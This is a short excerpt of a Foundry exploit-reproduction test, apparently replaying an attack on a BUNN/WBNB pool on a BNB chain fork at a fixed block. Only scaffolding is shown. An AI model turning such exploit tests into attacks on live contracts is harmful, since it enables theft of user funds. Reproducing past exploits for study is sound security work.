...
//forge test --match-path ./test/bunnTest.sol --match-test testExploit  -vvv  
contract ContractTest is Test {
    ...
    function setUp() external {
        cheats.createSelectFork("bsc", 29304627);
    }

    function testExploit() external {
       // console.log("Before swap,pair bunn balance:", BUNN.balanceOf(address(Bunn_Wbnb_Poll)));
...
//7708350182684  之前是 8708350182684